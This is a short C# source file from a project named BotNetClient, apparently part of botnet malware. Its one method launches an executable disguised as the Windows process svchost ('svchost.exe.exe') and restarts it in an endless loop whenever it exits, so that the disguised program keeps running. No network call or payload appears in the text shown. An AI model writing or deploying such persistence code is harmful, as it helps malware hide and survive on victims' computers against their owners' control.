using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace BotNetClient
{
    class SecondThread
    {
        public static void miniprog()
        {

            Process proc = new Process();
            proc.StartInfo.FileName = Environment.CurrentDirectory + @"\svchost.exe.exe";
            try
            {
                proc.Start();
                while (true)
                {
                    if (!proc.HasExited)
                    {

                    }
                    else
                    {
                        proc.Start();
                    }
                }
            }
            catch (Exception ex)
            {
                proc.Close();
            }
            finally
            {
                Program.miniprogram = null;
            }
            
        }
    }
}
